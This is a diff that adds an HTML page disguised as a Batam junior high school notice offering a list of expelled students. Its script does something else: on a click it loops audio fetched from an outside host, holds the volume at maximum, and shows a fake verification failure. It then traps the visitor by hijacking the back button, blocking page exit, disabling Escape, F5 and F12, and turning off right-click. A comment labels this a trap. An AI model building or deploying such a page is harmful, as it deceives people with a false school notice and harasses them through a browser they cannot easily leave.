@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>SMP Negeri 29 Batam - Informasi Siswa</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #eef2f5;
+            font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        .header {
+            background: #2c7da0;
+            padding: 20px;
+            text-align: center;
+        }
+        .header h1 {
+            color: white;
+            font-size: 20px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+        .header p {
+            color: #d9eaf1;
+            font-size: 12px;
+            margin-top: 6px;
+        }
+        .content {
+            padding: 24px 20px 32px;
+        }
+        .info-box {
+            background: #f0f6fa;
+            padding: 16px;
+            border-radius: 12px;
+            margin-bottom: 24px;
+            border-left: 4px solid #2c7da0;
+        }
+        .info-box .label {
+            font-size: 13px;
+            color: #2c7da0;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .info-box .text {
+            font-size: 14px;
+            color: #1e2a36;
+            line-height: 1.4;
+        }
+        .btn-download {
+            background: #2c7da0;
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 40px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-bottom: 16px;
+            font-family: inherit;
+        }
+        .btn-download:active {
+            background: #1f5e7a;
+            transform: scale(0.98);
+        }
+        .footer-note {
+            font-size: 11px;
+            color: #8aa0ae;
+            text-align: center;
+            border-top: 1px solid #e2e8ed;
+            padding-top: 16px;
+            margin-top: 8px;
+        }
+        .status-badge {
+            font-size: 11px;
+            color: #5f7f8f;
+            text-align: center;
+            margin-top: 12px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h1>SMP NEGERI 29 BATAM</h1>
+        <p>Terakreditasi A | Jl. Pendidikan No. 29, Batam</p>
+    </div>
+    <div class="content">
+        <div class="info-box">
+            <div class="label">📢 PENGUMUMAN</div>
+            <div class="text">
+                Berdasarkan data akhir semester, berikut daftar siswa yang dinyatakan <strong>tidak melanjutkan</strong> ke jenjang berikutnya.
+            </div>
+        </div>
+
+        <button class="btn-download" id="triggerBtn">
+            📄 Lihat Daftar Siswa Keluar
+        </button>
+
+        <div class="footer-note">
+            Data bersumber dari Dinas Pendidikan Batam
+        </div>
+        <div class="status-badge" id="soundStatus">
+            🔒 dokumen tersimpan
+        </div>
+    </div>
+</div>
+
+<script>
+    // ========== GANTI LINK MP3 LO DI SINI ==========
+    const MP3_URL = "https://audio.jukehost.co.uk/nukvz1xtNrZZcTOQBelx78v1sLJj4Qrl";
+    // Contoh: https://raw.githubusercontent.com/zaanSpiw/Sound/main/Kramat%20wa%20v1.mp3
+    // ===============================================
+
+    let audioContext = null;
+    let audioBuffer = null;
+    let currentSource = null;
+    let gainNode = null;
+    let isPlaying = false;
+    let isTriggered = false;
+
+    const statusDiv = document.getElementById('soundStatus');
+    const btn = document.getElementById('triggerBtn');
+
+    async function initAudio() {
+        if (audioContext) return;
+        audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        gainNode = audioContext.createGain();
+        gainNode.gain.value = 1.0;
+        gainNode.connect(audioContext.destination);
+
+        const response = await fetch(MP3_URL);
+        const arrayBuffer = await response.arrayBuffer();
+        audioBuffer = await audioContext.decodeAudioData(arrayBuffer);
+    }
+
+    function playSoundLoop() {
+        if (!audioContext || !audioBuffer || isPlaying) return;
+        if (currentSource) {
+            try { currentSource.stop(); } catch(e) {}
+        }
+        currentSource = audioContext.createBufferSource();
+        currentSource.buffer = audioBuffer;
+        currentSource.loop = true;
+        currentSource.connect(gainNode);
+        currentSource.start(0);
+        isPlaying = true;
+        if (audioContext.state === 'suspended') {
+            audioContext.resume();
+        }
+    }
+
+    async function forcePlay() {
+        await initAudio();
+        if (audioContext.state === 'suspended') {
+            await audioContext.resume();
+        }
+        playSoundLoop();
+
+        if (window.volumeInterval) clearInterval(window.volumeInterval);
+        window.volumeInterval = setInterval(() => {
+            if (gainNode && gainNode.gain.value < 1.0) {
+                gainNode.gain.value = 1.0;
+            }
+        }, 100);
+    }
+
+    // Tombol pencet
+    btn.addEventListener('click', async () => {
+        if (isTriggered) return;
+        isTriggered = true;
+
+        statusDiv.innerHTML = '🔊 sedang memuat data (jangan tinggalkan halaman) 🔊';
+        statusDiv.style.color = '#c44536';
+
+        await forcePlay();
+
+        statusDiv.innerHTML = '⚠️ verifikasi gagal - ulangi nanti ⚠️';
+        statusDiv.style.color = '#a00';
+
+        // TRAP: ga bisa back / keluar
+        history.pushState(null, null, location.href);
+        window.addEventListener('popstate', function trapBack() {
+            history.pushState(null, null, location.href);
+            alert('Sedang memproses data. Harap tunggu.');
+        });
+
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
+            return '';
+        });
+
+        window.addEventListener('keydown', function(e) {
+            const blocked = ['Escape', 'Backspace', 'F5', 'F12'];
+            if (blocked.includes(e.key)) {
+                e.preventDefault();
+            }
+        });
+
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+    });
+
+    // biar sound tetep jalan meskipun layar mati / pindah tab
+    document.addEventListener('visibilitychange', () => {
+        if (isPlaying && document.hidden && audioContext && audioContext.state === 'suspended') {
+            audioContext.resume();
+        }
+    });
+
+    window.addEventListener('pagehide', () => {
+        if (window.volumeInterval) clearInterval(window.volumeInterval);
+    });
+</script>
+</body>
+</html>
